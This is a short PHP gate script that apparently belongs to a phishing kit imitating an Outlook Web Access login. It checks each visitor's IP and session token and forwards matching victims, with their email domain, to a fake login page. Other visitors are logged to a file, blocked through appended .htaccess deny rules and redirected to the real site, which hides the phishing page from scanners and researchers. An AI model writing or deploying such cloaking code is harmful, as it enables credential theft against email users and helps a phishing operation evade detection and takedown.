<?php
session_start();
require_once('../config.php');
defined('9A466B642B0D29A62244DFB3521AF1E7A1333C9C111235243BE8AD0452A1666D3386D35C8ABE350505387D1164FF997C0238742') or exit();

if((isset($_SESSION['visitor_ip']) && !empty($_SESSION['visitor_ip'])) && (isset($_GET['sessid']) && ($_GET['sessid'] == $_SESSION['csrftoken']))){
	if ($_SESSION['visitor_ip'] == show_visitor_ip()) {
		$enc =   Random::AlphaNumeric(4);
		$_SESSION['hsh'] = $enc;
		$dom =  encodeDomain($_SESSION['owaemail']);
		exit(header("Location:login.php?c=$enc&replaceCurrent=1&url=$dom"));
	}
	else {
		$_SESSION = '';
		session_destroy();
		exit(header(sprintf("Location:%s", $originalurl)));
	}
}
else {
	$bot = show_visitor_ip().' - '.show_visitor_locationByIp('countryName');
	file_put_contents( 'botsip.txt', $bot."\r\n" , FILE_APPEND | LOCK_EX );	
	$blocked = 'deny from '.show_visitor_ip();
	file_put_contents( '.htaccess', $blocked."\r\n" , FILE_APPEND | LOCK_EX );	
	$_SESSION = '';
	session_destroy();
	exit(header(sprintf("Location:%s", $originalurl)));
}
	


?>
